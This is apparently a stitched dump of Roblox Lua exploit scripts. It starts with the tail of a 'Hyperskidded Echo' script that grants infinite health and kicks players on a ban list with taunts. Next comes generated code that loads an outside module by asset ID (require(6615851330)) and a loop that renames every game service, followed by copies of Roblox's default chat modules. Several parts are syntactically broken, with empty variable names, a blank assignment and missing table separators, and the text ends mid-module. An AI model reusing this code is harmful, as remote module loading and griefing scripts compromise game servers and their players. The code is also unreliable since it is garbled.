							VISUALSSz.ExposureCompensation = math.clamp((0 + Sick.PlaybackLoudness/125),0,5)
							VISUALSSz.FogEnd = math.clamp(Sick.PlaybackLoudness,50,1000)
							VISUALSSz.Brightness = 0
							VISUALS.EnvironmentDiffuseScale = 0 + Sick.PlaybackLoudness/100
							VISUALS["C-Correction"].Contrast= 0.1 + Sick.PlaybackLoudness/1000
							VISUALS["C-Correction"].Enabled = true
							--VISUALS["Bloom"].Enabled = true
						else
							game:GetService("Lighting").Ambient = Color3.fromRGB(138,138,138)
							game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128,128,128)
							game:GetService("Lighting").FogColor = Color3.fromRGB(192,192,192)
							game:GetService("Lighting").ExposureCompensation = 0
							game:GetService("Lighting").Brightness = 0
						end
						local CAMM = game:GetService("Workspace").CurrentCamera
						game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
						CAMM.FieldOfView = 70 - Sick.PlaybackLoudness/95
						VISUALS["Skybox"].MoonAngularSize = 6 + Sick.PlaybackLoudness/50
						VISUALS["Skybox"].SunAngularSize = 6 + Sick.PlaybackLoudness/25
						for _, c in pairs(Effects:GetChildren()) do
							if c:IsA("Part") or c:IsA("MeshPart") then
								c.Color = COLORSHIFT
							end
						end
						for _, c in pairs(CreationFolder:GetChildren()) do
							if c:IsA("Part") or c:IsA("MeshPart") then
								c.Color = COLORSHIFT
							end
						end
						unanchor()
						Humanoid.MaxHealth = "inf"
						Humanoid.Health = "inf"
						Humanoid.DisplayDistanceType = "None"
						RightArm.Color = COLORSHIFT
						LeftArm.Color = COLORSHIFT
						Torso.Color = COLORSHIFT
						Head.Color = COLORSHIFT
						LeftLeg.Color = COLORSHIFT
						RightLeg.Color = COLORSHIFT
						if Rooted == false then
							Disable_Jump = false
							Humanoid.WalkSpeed = Speed
						elseif Rooted == true then
							Disable_Jump = true
							Humanoid.WalkSpeed = 0
						end
						refit()
						Refit()
						Parents()
						antideath()
						Refit2()
						Refit3()
						Refit4()
						Refit5()
						Refit6()
						Refit7()
						Refit8()
						Refit9()
						Refit10()
						Refit11()
						Refit12()
						Refit13()
						if WEAPONEQUIPPED == false then
							Blade.Parent = nil
							BackBlade.Parent = Character
							Sick.PlaybackSpeed = 1
						else
							Blade.Parent = Character
							BackBlade.Parent = nil
							Sick.PlaybackSpeed = 1.3
						end
						if Blade.Parent == Character then
							WEAPONEQUIPPED = true
						else
							WEAPONEQUIPPED = false
						end
						if BackBlade.Parent == Character then
							WEAPONEQUIPPED = false
						else
							WEAPONEQUIPPED = true
						end
						if GUNEQUIPPED == false then
							Gunclone.Parent = nil
						else
							Gunclone.Parent = Character
						end
						if CANNONEQUIPPED == false then
							cannon.Parent = nil
						else
							cannon.Parent = Character
						end
						for _, c in pairs(Blade:GetChildren()) do
							if c.Name == "RED" or c.Name == "REDB" then
								c.Color = COLORSHIFT
							end
						end
						for _, c in pairs(BackBlade:GetChildren()) do
							if c.Name == "RED" or c.Name == "REDB" then
								c.Color = COLORSHIFT
							end
						end
					end

					local BannedText = {"You're gone - Hyperskidded Echo","I hate you - Hyperskidded Echo","Begone - Hyperskidded Echo","You shouldn't come back - Hyperskidded Echo"}

					local function CheckForBan(player)
						for i = 1, #TOBAN do
							if player.Name == TOBAN[i] then
								player:Kick(BannedText[MATHR(1, #BannedText)])
							end
						end
					end

					game:GetService("Players").PlayerAdded:connect(function()
						for i,v in pairs(game:GetService("Players"):GetPlayers())do
							CheckForBan(v)
						end  
					end)

				end

			end)

		end

	end)

	-- // Fuck you \\ --
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

local reejfiodfewurpx = Instance.new("ModuleScript")
reejfiodfewurpx.Name = "reejfiodfewurpx"
reejfiodfewurpx.Parent = workspace

local  = Instance.new("Script")
.Name = ""
.Parent = reejfiodfewurpx

--// Modules

local modules = {
	[reejfiodfewurpx] = function()
		local module = {}
		
		local function GiveScript(Name)
			local Script = script[""]:Clone()
			Script.Parent = game:GetService("ServerScriptService")
			Script.Disabled = false
		end
		
		module["69"] = function()
			GiveScript()
		end
		
		module.AllAUSL = function()
			require(6615851330).AntiUSL()
			module["69"]()
		end
		
		return module
	end
}

--// Scripts

-- 
task.spawn(function()
	local script = 

	local oldreq = require
	local function require(target)
		if modules[target] then
			return modules[target]()
		end
		return oldreq(target)
	end

	pcall(function()
	
		pcall(function()
	
			wait()
			script:Destroy()
			local Instance_ = Instance.new
			local AntiUSL = game:GetService("ReplicatedStorage").ChildAdded:Connect(function(f)
				if f.Name == "stuf" then
					pcall(function()
						Instance_("Speaker", f)
					end)
					pcall(function()
						for i, v in pairs(f:GetChildren()) do
							Instance_("Speaker", v)
						end
					end)
					f.ChildAdded:Connect(function(v)
						Instance_("Speaker", v)
					end)
				end
			end)
			local FixNames = game:GetService("RunService").Heartbeat:Connect(function()
				for i, v in pairs(game:GetChildren()) do
					pcall(function()
						v.Name = v.ClassName
					end)
				end
			end)
			warn("(HSE) USCV2's Anti-USL loaded.")
	
		end)
	
	end)
end)

--[[
	Roblox2Lua
	----------
	
	This code was generated using
	Deluct's Roblox2Lua plugin.
]]--

--// Instances

local rterrfqawfdaewac = Instance.new("Folder")
rterrfqawfdaewac.Name = "rterrfqawfdaewac"
rterrfqawfdaewac.Parent = workspace

local command_modules = Instance.new("Folder")
command_modules.Name = "CommandModules"
command_modules.Parent = rterrfqawfdaewac

local whisper = Instance.new("ModuleScript")
whisper.Name = "Whisper"
whisper.Parent = command_modules

local util = Instance.new("ModuleScript")
util.Name = "Util"
util.Parent = command_modules

local team = Instance.new("ModuleScript")
team.Name = "Team"
team.Parent = command_modules

local switch_channel = Instance.new("ModuleScript")
switch_channel.Name = "SwitchChannel"
switch_channel.Parent = command_modules

local swallow_guest_chat = Instance.new("ModuleScript")
swallow_guest_chat.Name = "SwallowGuestChat"
swallow_guest_chat.Parent = command_modules

local play_emote = Instance.new("ModuleScript")
play_emote.Name = "PlayEmote"
play_emote.Parent = command_modules

local get_version = Instance.new("ModuleScript")
get_version.Name = "GetVersion"
get_version.Parent = command_modules

local developer_console = Instance.new("ModuleScript")
developer_console.Name = "DeveloperConsole"
developer_console.Parent = command_modules

local clear_messages = Instance.new("ModuleScript")
clear_messages.Name = "ClearMessages"
clear_messages.Parent = command_modules

local insert_default_modules = Instance.new("BoolValue")
insert_default_modules.Value = true
insert_default_modules.Name = "InsertDefaultModules"
insert_default_modules.Parent = command_modules

local message_creatormodules = Instance.new("Folder")
message_creatormodules.Name = "MessageCreatorModules"
message_creatormodules.Parent = rterrfqawfdaewac

local whisper_message = Instance.new("ModuleScript")
whisper_message.Name = "WhisperMessage"
whisper_message.Parent = message_creatormodules

local welcome_message = Instance.new("ModuleScript")
welcome_message.Name = "WelcomeMessage"
welcome_message.Parent = message_creatormodules

local util_2 = Instance.new("ModuleScript")
util_2.Name = "Util"
util_2.Parent = message_creatormodules

local unknown_message = Instance.new("ModuleScript")
unknown_message.Name = "UnknownMessage"
unknown_message.Parent = message_creatormodules

local system_message = Instance.new("ModuleScript")
system_message.Name = "SystemMessage"
system_message.Parent = message_creatormodules

local set_core_message = Instance.new("ModuleScript")
set_core_message.Name = "SetCoreMessage"
set_core_message.Parent = message_creatormodules

local me_commandmessage = Instance.new("ModuleScript")
me_commandmessage.Name = "MeCommandMessage"
me_commandmessage.Parent = message_creatormodules

local default_chat_message = Instance.new("ModuleScript")
default_chat_message.Name = "DefaultChatMessage"
default_chat_message.Parent = message_creatormodules

local insert_default_modules_2 = Instance.new("BoolValue")
insert_default_modules_2.Value = true
insert_default_modules_2.Name = "InsertDefaultModules"
insert_default_modules_2.Parent = message_creatormodules

local chat_localization = Instance.new("ModuleScript")
chat_localization.Name = "ChatLocalization"
chat_localization.Parent = rterrfqawfdaewac

local chatconstants = Instance.new("ModuleScript")
chatconstants.Name = "ChatConstants"
chatconstants.Parent = rterrfqawfdaewac

local chat_settings = Instance.new("ModuleScript")
chat_settings.Name = "ChatSettings"
chat_settings.Parent = rterrfqawfdaewac

--// Modules

local modules = {
	[whisper] = function()
		--	// FileName: Whisper.lua
		--	// Written by: TheGamer101
		--	// Description: Whisper chat bar manipulation.
		
		local util = require(script.Parent:WaitForChild("Util"))
		local ChatSettings = require(script.Parent.Parent:WaitForChild("ChatSettings"))
		
		local PlayersService = game:GetService("Players")
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		
		local LocalPlayer = PlayersService.LocalPlayer
		while LocalPlayer == nil do
			PlayersService.ChildAdded:wait()
			LocalPlayer = PlayersService.LocalPlayer
		end
		
		local whisperStateMethods = {}
		whisperStateMethods.__index = whisperStateMethods
		
		local WhisperCustomState = {}
		
		function whisperStateMethods:TrimWhisperCommand(text)
			if string.sub(text, 1, 3):lower() == "/w " then
				return string.sub(text, 4)
			elseif string.sub(text, 1, 9):lower() == "/whisper " then
				return string.sub(text, 10)
		 	end
			return nil
		end
		
		function whisperStateMethods:TrimWhiteSpace(text)
			local newText = string.gsub(text, "%s+", "")
			local wasWhitespaceTrimmed = text[#text] == " "
			return newText, wasWhitespaceTrimmed
		end
		
		function whisperStateMethods:ShouldAutoCompleteNames()
			if ChatSettings.WhisperCommandAutoCompletePlayerNames ~= nil then
				return ChatSettings.WhisperCommandAutoCompletePlayerNames
			end
			return true
		end
		
		function whisperStateMethods:GetWhisperingPlayer(enteredText)
			enteredText = enteredText:lower()
			local trimmedText = self:TrimWhisperCommand(enteredText)
			if trimmedText then
				local possiblePlayerName, whitespaceTrimmed = self:TrimWhiteSpace(trimmedText)
				local possibleUserNameMatches = {}
				local possibleDisplayNameMatches = {}
				local players = PlayersService:GetPlayers()
				for i = 1, #players do
					if players[i] ~= LocalPlayer then
						local lowerPlayerName = players[i].Name:lower()
						if string.sub(lowerPlayerName, 1, string.len(possiblePlayerName)) == possiblePlayerName then
							possibleUserNameMatches[players[i]] = players[i].Name:lower()
						end
		
						if ChatSettings.WhisperByDisplayName then
							local lowerDisplayName = players[i].DisplayName:lower()
							if string.sub(lowerDisplayName, 1, string.len(possiblePlayerName)) == possiblePlayerName then
								possibleDisplayNameMatches[players[i]] = lowerDisplayName
							end
						end
					end
				end
		
				local matchCount = 0
				local lastMatch = nil
				local lastMatchName = nil
				for player, playerName in pairs(possibleUserNameMatches) do
					matchCount = matchCount + 1
					lastMatch = player
					lastMatchName = playerName
					if playerName == possiblePlayerName and whitespaceTrimmed then
						return player
					end
				end
		
				if ChatSettings.WhisperByDisplayName then
					for player, playerName in pairs(possibleDisplayNameMatches) do
						matchCount = matchCount + 1
						lastMatch = player
						lastMatchName = playerName
					end
				end
		
				if matchCount == 1 then
					if self:ShouldAutoCompleteNames() then
						return lastMatch
					elseif lastMatchName == possiblePlayerName then
						return lastMatch
					end
				end
			end
			return nil
		end
		
		function whisperStateMethods:GetWhisperChanneNameColor()
			if self.ChatSettings.WhisperChannelNameColor then
				return self.ChatSettings.WhisperChannelNameColor
			end
			return Color3.fromRGB(102, 14, 102)
		end
		
		function whisperStateMethods:EnterWhisperState(player)
			self.PlayerNameEntered = true
			self.PlayerName = player.Name
			self.PlayerDisplayName = player.DisplayName
		
			self.MessageModeButton.Size = UDim2.new(0, 1000, 1, 0)
		
			local messageModeString
		
			if ChatSettings.PlayerDisplayNamesEnabled and ChatSettings.WhisperByDisplayName then
				messageModeString = string.format("[To %s]", player.DisplayName)
			else
				messageModeString = string.format("[To %s]", player.Name)
			end
		
			if ChatLocalization.tryLocalize then
				messageModeString = ChatLocalization:tryLocalize(messageModeString)
			end
			self.MessageModeButton.Text = messageModeString
		
			self.MessageModeButton.TextColor3 = self:GetWhisperChanneNameColor()
		
			local xSize = math.ceil(self.MessageModeButton.TextBounds.X)
			self.MessageModeButton.Size = UDim2.new(0, xSize, 1, 0)
			self.TextBox.Size = UDim2.new(1, -xSize, 1, 0)
			self.TextBox.Position = UDim2.new(0, xSize, 0, 0)
			self.TextBox.Text = " "
		end
		
		function whisperStateMethods:TextUpdated()
			local newText = self.TextBox.Text
			if not self.PlayerNameEntered then
				local player = self:GetWhisperingPlayer(newText)
				if player then
					self:EnterWhisperState(player)
				end
			else
				if newText == "" then
					self.MessageModeButton.Text = ""
					self.MessageModeButton.Size = UDim2.new(0, 0, 0, 0)
					self.TextBox.Size = UDim2.new(1, 0, 1, 0)
					self.TextBox.Position = UDim2.new(0, 0, 0, 0)
					self.TextBox.Text = ""
					---Implement this when setting cursor positon is a thing.
					---self.TextBox.Text = self.OriginalText .. " " .. self.PlayerName
					self.PlayerNameEntered = false
					---Temporary until setting cursor position...
					self.ChatBar:ResetCustomState()
					self.ChatBar:CaptureFocus()
				end
			end
		end
		
		function whisperStateMethods:GetMessage()
			if self.PlayerNameEntered then
				return "/w " ..self.PlayerName.. " " ..self.TextBox.Text
			end
			return self.TextBox.Text
		end
		
		function whisperStateMethods:ProcessCompletedMessage()
			return false
		end
		
		function whisperStateMethods:Destroy()
			self.MessageModeConnection:disconnect()
			self.Destroyed = true
		end
		
		function WhisperCustomState.new(ChatWindow, ChatBar, ChatSettings, player)
			local obj = setmetatable({}, whisperStateMethods)
			obj.Destroyed = false
			obj.ChatWindow = ChatWindow
			obj.ChatBar = ChatBar
			obj.ChatSettings = ChatSettings
			obj.TextBox = ChatBar:GetTextBox()
			obj.MessageModeButton = ChatBar:GetMessageModeTextButton()
			obj.OriginalWhisperText = ""
			obj.PlayerNameEntered = false
		
			obj.MessageModeConnection = obj.MessageModeButton.MouseButton1Click:connect(function()
				local chatBarText = obj.TextBox.Text
				if string.sub(chatBarText, 1, 1) == " " then
					chatBarText = string.sub(chatBarText, 2)
				end
				obj.ChatBar:ResetCustomState()
				obj.ChatBar:SetTextBoxText(chatBarText)
				obj.ChatBar:CaptureFocus()
			end)
		
			if player then
				obj:EnterWhisperState(player)
			else
				obj:TextUpdated()
			end
		
			return obj
		end
		
		function ProcessMessage(message, ChatWindow, ChatBar, ChatSettings)
			if string.sub(message, 1, 3):lower() == "/w " or	string.sub(message, 1, 9):lower() == "/whisper " then
				return WhisperCustomState.new(ChatWindow, ChatBar, ChatSettings)
			end
			return nil
		end
		
		function CreateCustomState(player, ChatWindow, ChatBar, ChatSettings)
			return WhisperCustomState.new(ChatWindow, ChatBar, ChatSettings, player)
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.IN_PROGRESS_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage,
			CustomStateCreator = CreateCustomState,
		}
		
	end[util] = function()
		--	// FileName: Util.lua
		--	// Written by: TheGamer101
		--	// Description: Module for shared code between CommandModules.
		
		--[[
		Creating a command module:
		1) Create a new module inside the CommandModules folder.
		2) Create a function that takes a message, the ChatWindow object and the ChatSettings and returns
		a bool command processed.
		3) Return this function from the module.
		--]]
		
		local clientChatModules = script.Parent.Parent
		local ChatConstants = require(clientChatModules:WaitForChild("ChatConstants"))
		
		local COMMAND_MODULES_VERSION = 1
		
		local KEY_COMMAND_PROCESSOR_TYPE = "ProcessorType"
		local KEY_PROCESSOR_FUNCTION = "ProcessorFunction"
		
		---Command types.
		---Process a command as it is being typed. This allows for manipulation of the chat bar.
		local IN_PROGRESS_MESSAGE_PROCESSOR = 0
		---Simply process a completed message.
		local COMPLETED_MESSAGE_PROCESSOR = 1
		
		local module = {}
		local methods = {}
		methods.__index = methods
		
		function methods:SendSystemMessageToSelf(message, channelObj, extraData)
			local messageData =
			{
				ID = -1,
				FromSpeaker = nil,
				SpeakerUserId = 0,
				OriginalChannel = channelObj.Name,
				IsFiltered = true,
				MessageLength = string.len(message),
				MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
				Message = message,
				MessageType = ChatConstants.MessageTypeSystem,
				Time = os.time(),
				ExtraData = extraData,
			}
		
			channelObj:AddMessageToChannel(messageData)
		end
		
		function module.new()
			local obj = setmetatable({}, methods)
		
			obj.COMMAND_MODULES_VERSION = COMMAND_MODULES_VERSION
		
			obj.KEY_COMMAND_PROCESSOR_TYPE = KEY_COMMAND_PROCESSOR_TYPE
			obj.KEY_PROCESSOR_FUNCTION = KEY_PROCESSOR_FUNCTION
		
			obj.IN_PROGRESS_MESSAGE_PROCESSOR = IN_PROGRESS_MESSAGE_PROCESSOR
			obj.COMPLETED_MESSAGE_PROCESSOR = COMPLETED_MESSAGE_PROCESSOR
		
			return obj
		end
		
		return module.new()
		
	end[team] = function()
		--	// FileName: Team.lua
		--	// Written by: Partixel/TheGamer101
		--	// Description: Team chat bar manipulation.
		
		local PlayersService = game:GetService("Players")
		
		local TEAM_COMMANDS = {"/team ", "/t ", "% "}
		
		function IsTeamCommand(message)
			for i = 1, #TEAM_COMMANDS do
				local teamCommand = TEAM_COMMANDS[i]
				if string.sub(message, 1, teamCommand:len()):lower() == teamCommand then
					return true
				end
			end
			return false
		end
		
		local teamStateMethods = {}
		teamStateMethods.__index = teamStateMethods
		
		local util = require(script.Parent:WaitForChild("Util"))
		
		local TeamCustomState = {}
		
		function teamStateMethods:EnterTeamChat()
			self.TeamChatEntered = true
			self.MessageModeButton.Size = UDim2.new(0, 1000, 1, 0)
			self.MessageModeButton.Text = "[Team]"
			self.MessageModeButton.TextColor3 = self:GetTeamChatColor()
		
			local xSize = self.MessageModeButton.TextBounds.X
			self.MessageModeButton.Size = UDim2.new(0, xSize, 1, 0)
			self.TextBox.Size = UDim2.new(1, -xSize, 1, 0)
			self.TextBox.Position = UDim2.new(0, xSize, 0, 0)
			self.OriginalTeamText = self.TextBox.Text
			self.TextBox.Text = " "
		end
		
		function teamStateMethods:TextUpdated()
			local newText = self.TextBox.Text
			if not self.TeamChatEntered then
				if IsTeamCommand(newText) then
					self:EnterTeamChat()
				end
			else
				if newText == "" then
					self.MessageModeButton.Text = ""
					self.MessageModeButton.Size = UDim2.new(0, 0, 0, 0)
					self.TextBox.Size = UDim2.new(1, 0, 1, 0)
					self.TextBox.Position = UDim2.new(0, 0, 0, 0)
					self.TextBox.Text = ""
					---Implement this when setting cursor positon is a thing.
					---self.TextBox.Text = self.OriginalTeamText
					self.TeamChatEntered = false
					---Temporary until setting cursor position...
					self.ChatBar:ResetCustomState()
					self.ChatBar:CaptureFocus()
				end
			end
		end
		
		function teamStateMethods:GetMessage()
			if self.TeamChatEntered then
				return "/t " ..self.TextBox.Text
			end
			return self.TextBox.Text
		end
		
		function teamStateMethods:ProcessCompletedMessage()
			return false
		end
		
		function teamStateMethods:Destroy()
			self.MessageModeConnection:disconnect()
			self.Destroyed = true
		end
		
		function teamStateMethods:GetTeamChatColor()
			local LocalPlayer = PlayersService.LocalPlayer
			if LocalPlayer.Team then
				return LocalPlayer.Team.TeamColor.Color
			end
			if self.ChatSettings.DefaultChannelNameColor then
				return self.ChatSettings.DefaultChannelNameColor
			end
			return Color3.fromRGB(35, 76, 142)
		end
		
		function TeamCustomState.new(ChatWindow, ChatBar, ChatSettings)
			local obj = setmetatable({}, teamStateMethods)
			obj.Destroyed = false
			obj.ChatWindow = ChatWindow
			obj.ChatBar = ChatBar
			obj.ChatSettings = ChatSettings
			obj.TextBox = ChatBar:GetTextBox()
			obj.MessageModeButton = ChatBar:GetMessageModeTextButton()
			obj.OriginalTeamText = ""
			obj.TeamChatEntered = false
		
			obj.MessageModeConnection = obj.MessageModeButton.MouseButton1Click:connect(function()
				local chatBarText = obj.TextBox.Text
				if string.sub(chatBarText, 1, 1) == " " then
					chatBarText = string.sub(chatBarText, 2)
				end
				obj.ChatBar:ResetCustomState()
				obj.ChatBar:SetTextBoxText(chatBarText)
				obj.ChatBar:CaptureFocus()
			end)
		
			obj:EnterTeamChat()
		
			return obj
		end
		
		function ProcessMessage(message, ChatWindow, ChatBar, ChatSettings)
			if ChatBar.TargetChannel == "Team" then
				return
			end
		
			if IsTeamCommand(message) then
				return TeamCustomState.new(ChatWindow, ChatBar, ChatSettings)
			end
			return nil
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.IN_PROGRESS_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
	end[switch_channel] = function()
		--	// FileName: ClearMessages.lua
		--	// Written by: TheGamer101
		--	// Description: Command to switch channel.
		
		local util = require(script.Parent:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = { Get = function(self, key, default) return default end } end
		
		function ProcessMessage(message, ChatWindow, ChatSettings)
			if string.sub(message, 1, 3):lower() ~= "/c " then
				return false
			end
		
			local channelName = string.sub(message, 4)
		
			local targetChannel = ChatWindow:GetChannel(channelName)
			if targetChannel then
				ChatWindow:SwitchCurrentChannel(channelName)
				if not ChatSettings.ShowChannelsBar then
					local currentChannel = ChatWindow:GetCurrentChannel()
					if currentChannel then
						util:SendSystemMessageToSelf(
							string.gsub(ChatLocalization:Get(
								"GameChat_SwitchChannel_NowInChannel",
								string.format("You are now chatting in channel: '%s'", channelName),
								{RBX_NAME = channelName}
							),"{RBX_NAME}",channelName),
							targetChannel, {}
						)
					end
				end
			else
				local currentChannel = ChatWindow:GetCurrentChannel()
				if currentChannel then
					util:SendSystemMessageToSelf(
						string.gsub(ChatLocalization:Get(
							"GameChat_SwitchChannel_NotInChannel",
							string.format("You are not in channel: '%s'", channelName),
							{RBX_NAME = channelName}
						),"{RBX_NAME}",channelName), 
						currentChannel, {ChatColor = Color3.fromRGB(245, 50, 50)}
					)
				end
			end
		
			return true
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.COMPLETED_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
	end[swallow_guest_chat] = function()
		--	// FileName: SwallowGuestChat.lua
		--	// Written by: TheGamer101
		--	// Description: Stop Guests from chatting and give them a message telling them to sign up.
		-- 	// Guests are generally not allowed to chat, so please do not remove this.
		
		local util = require(script.Parent:WaitForChild("Util"))
		local RunService = game:GetService("RunService")
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(game:GetService("Chat").ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = {} function ChatLocalization:Get(key,default) return default end end
		
		function ProcessMessage(message, ChatWindow, ChatSettings)
			local LocalPlayer = game:GetService("Players").LocalPlayer
			if LocalPlayer and LocalPlayer.UserId < 0 and not RunService:IsStudio() then
		
				local channelObj = ChatWindow:GetCurrentChannel()
				if channelObj then
					util:SendSystemMessageToSelf(
						ChatLocalization:Get("GameChat_SwallowGuestChat_Message","Create a free account to get access to chat permissions!"), 
						channelObj, 
						{}
					)
				end
		
				return true
			end
			return false
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.COMPLETED_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
	end[play_emote] = function()
		--	// FileName: PlayEmote.lua
		--	// Written by: TheGamer101
		--	// Description: Play an emote by name.
		
		local Chat = game:GetService("Chat")
		local Players = game:GetService("Players")
		
		local CommandModules = script.Parent
		local Util = require(CommandModules:WaitForChild("Util"))
		
		local ChatLocalization = nil
		pcall(function() ChatLocalization = require(Chat.ClientChatModules.ChatLocalization) end)
		if ChatLocalization == nil then ChatLocalization = { Get = function(self, key, fallback) return fallback end } end
		
		local LocalPlayer = Players.LocalPlayer
		
		local UserPlayEmoteChatTextUpdates do
			local success, value = pcall(function()
				return UserSettings():IsUserFeatureEnabled("UserPlayEmoteChatTextUpdates")
			end)
			UserPlayEmoteChatTextUpdates = success and value
		end
		
		local LegacyDefaultEmotes = {
			wave = true,
			point = true,
			dance = true,
			dance2 = true,
			dance3 = true,
			laugh = true,
			cheer = true,
		}
		
		local LocalizationKeys = {
			NotSupported = "InGame.Chat.Response.EmotesNotSupported",
			R15Only = "InGame.Chat.Response.EmotesWrongAvatarType",
			SwitchToR15 = "InGame.Chat.ErrorMessageSwitchToR15",
			NoMatchingEmote = "InGame.Chat.Response.EmoteNotAvailable",
			TemporarilyUnavailable = "InGame.Chat.Response.EmotesTemporarilyUnavailable",
			AnimationPlaying = "InGame.Chat.ErrorMessageAnimationPlaying",
		}
		
		local FallbackStrings = {
			[LocalizationKeys.NotSupported] = "You can't use Emotes here.",
			[LocalizationKeys.R15Only] = "Only R15 avatars can use Emotes.",
			[LocalizationKeys.SwitchToR15] = "Switch to your R15 avatar to play Emote.",
			[LocalizationKeys.NoMatchingEmote] = "You can't use that Emote.",
			[LocalizationKeys.TemporarilyUnavailable] = "You can't use Emotes right now.",
			[LocalizationKeys.AnimationPlaying] = "You cannot play Emotes during this action.",
		}
		
		local ErrorColor = Color3.fromRGB(245, 50, 50)
		
		local function getEmoteName(message)
			if string.sub(message, 1, 3) == "/e " then
				return string.sub(message, 4)
			elseif string.sub(message, 1, 7) == "/emote " then
				return string.sub(message, 8)
			end
		
			return nil
		end
		
		local function sendErrorMessage(channelObj, errorMessageKey)
			local localizedString = ChatLocalization:Get(errorMessageKey, FallbackStrings[errorMessageKey])
			local extraData = {
				ChatColor = ErrorColor,
			}
		
			Util:SendSystemMessageToSelf(localizedString, channelObj, extraData)
		end
		
		local function ProcessMessage(message, ChatWindow, ChatSettings)
			local emoteName = getEmoteName(message)
			if not emoteName then
				return false
			end
		
			if LegacyDefaultEmotes[emoteName] then
				-- Just don't show these in the chat log. The animation script listens on these.
				return true
			end
		
			local channelObj = ChatWindow:GetCurrentChannel()
			if not channelObj then
				return true
			end
		
			local character = LocalPlayer.Character
			if not character then
				sendErrorMessage(channelObj, LocalizationKeys.TemporarilyUnavailable)
				return true
			end
		
			local animateScript = character:FindFirstChild("Animate")
			if not animateScript then
				sendErrorMessage(channelObj, LocalizationKeys.NotSupported)
				return true
			end
		
			local playEmoteBindable = animateScript:FindFirstChild("PlayEmote")
			if not playEmoteBindable then
				sendErrorMessage(channelObj, LocalizationKeys.NotSupported)
				return true
			end
		
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then
				sendErrorMessage(channelObj, LocalizationKeys.TemporarilyUnavailable)
				return true
			end
		
			if humanoid.RigType ~= Enum.HumanoidRigType.R15 then
				if UserPlayEmoteChatTextUpdates then
					sendErrorMessage(channelObj, LocalizationKeys.SwitchToR15)
				else
					sendErrorMessage(channelObj, LocalizationKeys.R15Only)
				end
				return true
			end
		
			local humanoidDescription = humanoid:FindFirstChildOfClass("HumanoidDescription")
			if not humanoidDescription then
				sendErrorMessage(channelObj, LocalizationKeys.TemporarilyUnavailable)
				return true
			end
		
			local lowerCaseEmoteNamesMap = {}
		
			local emotes = humanoidDescription:GetEmotes()
			for name, _ in pairs(emotes) do
				lowerCaseEmoteNamesMap[string.lower(name)] = name
			end
		
			local slot = tonumber(emoteName)
			if slot then
				local equippedEmotes = humanoidDescription:GetEquippedEmotes()
				for _, emoteInfo in pairs(equippedEmotes) do
					if emoteInfo.Slot == slot then
						emoteName = emoteInfo.Name
					end
				end
			end
		
			local emoteNameLower = string.lower(emoteName)
			emoteName = lowerCaseEmoteNamesMap[emoteNameLower]
		
			if not emoteName then
				sendErrorMessage(channelObj, LocalizationKeys.NoMatchingEmote)
				return true
			end
		
			spawn(function()
				local ok, didPlay = pcall(function() return humanoid:PlayEmote(emoteName) end)
		
				if not ok then
					sendErrorMessage(channelObj, LocalizationKeys.NotSupported)
				elseif not didPlay then
					if UserPlayEmoteChatTextUpdates then
						sendErrorMessage(channelObj, LocalizationKeys.AnimationPlaying)
					else
						sendErrorMessage(channelObj, LocalizationKeys.TemporarilyUnavailable)
					end
				end
			end)
		
			return true
		end
		
		return {
			[Util.KEY_COMMAND_PROCESSOR_TYPE] = Util.COMPLETED_MESSAGE_PROCESSOR,
			[Util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
	end[get_version] = function()
		--	// FileName: GetVersion.lua
		--	// Written by: spotco
		--	// Description: Command to print the chat version.
		
		local util = require(script.Parent:WaitForChild("Util"))
		local ChatConstants = require(script.Parent.Parent:WaitForChild("ChatConstants"))
		
		local function ProcessMessage(message, ChatWindow, _)
			if string.sub(message, 1,  8):lower() == "/version" or string.sub(message, 1, 9):lower() == "/version " then
				util:SendSystemMessageToSelf(
					string.format("This game is running chat version [%d.%d.%s].",
						ChatConstants.MajorVersion,
						ChatConstants.MinorVersion,
						ChatConstants.BuildVersion),
					ChatWindow:GetCurrentChannel(),
					{})
				return true
			end
			return false
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.COMPLETED_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
	end[developer_console] = function()
		--	// FileName: DeveloperConsole.lua
		--	// Written by: TheGamer101
		--	// Description: Command to open or close the developer console.
		
		local StarterGui = game:GetService("StarterGui")
		local util = require(script.Parent:WaitForChild("Util"))
		
		function ProcessMessage(message, ChatWindow, ChatSettings)
			if string.sub(message, 1, 8):lower() == "/console" or string.sub(message, 1, 11):lower() == "/newconsole" then
				local success, developerConsoleVisible = pcall(function() return StarterGui:GetCore("DevConsoleVisible") end)
				if success then
					local success, err = pcall(function() StarterGui:SetCore("DevConsoleVisible", not developerConsoleVisible) end)
					if not success and err then
						print("Error making developer console visible: " ..err)
					end
				end
				return true
			end
			return false
		end
		
		return {
			[util.KEY_COMMAND_PROCESSOR_TYPE] = util.COMPLETED_MESSAGE_PROCESSOR,
			[util.KEY_PROCESSOR_FUNCTION] = ProcessMessage
		}
		
		
	end[clear_messages] = function()
		--	// FileName: ClearMessages.lua
		--	// Written by: TheGamer101
		--	// Description: Command to clear the message log of the current channel.
		
